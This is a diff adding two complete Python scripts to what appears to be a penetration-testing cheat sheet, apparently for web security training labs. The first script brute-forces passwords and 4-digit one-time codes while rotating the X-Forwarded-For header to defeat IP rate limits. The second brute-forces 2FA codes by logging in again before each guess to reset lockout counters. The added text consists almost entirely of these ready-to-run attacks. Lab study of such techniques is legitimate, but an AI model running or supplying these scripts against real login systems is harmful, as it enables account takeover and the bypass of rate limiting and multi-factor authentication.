@@ -99,6 +99,82 @@ for code in range(100000, 100050):  # Start with small range to test
 # 5. Send OTP in different formats: JSON vs form-encoded vs XML
 ```
 
+### Brute Force with X-Forwarded-For IP Rotation (Practitioner Critical)
+
+```python
+#!/usr/bin/env python3
+"""Brute force OTP/password with X-Forwarded-For rotation to bypass IP-based rate limits."""
+import requests
+
+TARGET = "https://TARGET"
+USERNAME = "carlos"
+
+# For password brute force:
+passwords = ["123456", "password", "admin", "letmein", "welcome", "monkey", "dragon",
+             "master", "qwerty", "login", "princess", "abc123", "trustno1", "photon"]
+
+for i, pwd in enumerate(passwords):
+    r = requests.post(f"{TARGET}/login", 
+                      data={"username": USERNAME, "password": pwd},
+                      headers={"X-Forwarded-For": f"192.168.0.{i % 255 + 1}"},
+                      allow_redirects=False, verify=False)
+    
+    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
+        print(f"[FOUND] Password: {pwd}")
+        break
+    elif r.status_code == 302 and "/login2" in r.headers.get("Location", ""):
+        print(f"[FOUND] Valid creds, needs 2FA: {pwd}")
+        break
+
+# For OTP brute force with IP rotation:
+for code in range(0, 10000):
+    otp = str(code).zfill(4)
+    r = requests.post(f"{TARGET}/login2",
+                      data={"mfa-code": otp},
+                      headers={"X-Forwarded-For": f"10.0.{code // 255}.{code % 255 + 1}"},
+                      cookies={"session": "YOUR_SESSION"},
+                      allow_redirects=False, verify=False)
+    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
+        print(f"[FOUND] OTP: {otp}")
+        break
+```
+
+### Brute Force 2FA with Macro (Re-Login Per Attempt)
+
+When the app locks out after N wrong OTP attempts, re-login for each attempt to reset the counter:
+
+```python
+#!/usr/bin/env python3
+"""Brute force 2FA code by re-logging in each attempt to avoid lockout."""
+import requests
+
+TARGET = "https://TARGET"
+USERNAME = "victim"
+PASSWORD = "known_password"
+
+for code in range(0, 10000):
+    otp = str(code).zfill(4)
+    
+    s = requests.Session()
+    
+    # Step 1: Fresh login to get new session
+    s.post(f"{TARGET}/login", data={"username": USERNAME, "password": PASSWORD}, 
+           allow_redirects=True, verify=False)
+    
+    # Step 2: Submit OTP attempt
+    r = s.post(f"{TARGET}/login2", data={"mfa-code": otp}, 
+               allow_redirects=False, verify=False)
+    
+    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
+        print(f"[FOUND] 2FA code: {otp}")
+        # Get authenticated session cookie
+        print(f"Session: {s.cookies.get('session')}")
+        break
+    
+    if code % 100 == 0:
+        print(f"Tried {code} codes...")
+```
+
 ### Step 5: Backup Code Abuse
 ```bash
 # Test if backup codes have weaknesses
